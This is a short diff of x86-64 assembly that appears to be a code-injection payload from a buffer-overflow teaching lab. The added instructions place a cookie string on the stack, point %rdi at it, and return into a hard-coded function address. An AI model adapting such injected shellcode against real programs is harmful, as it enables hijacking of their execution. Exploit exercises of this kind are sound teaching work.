@@ -1,1 +1,7 @@
-movq $0x59b997fa, %rdi
+movq $0x6166373939623935, %rax
+movq %rax, (%rsp)
+movb $0x0, 8(%rsp)   
+movq %rsp, %rdi     
+pushq $0x4018fa    
+ret
+
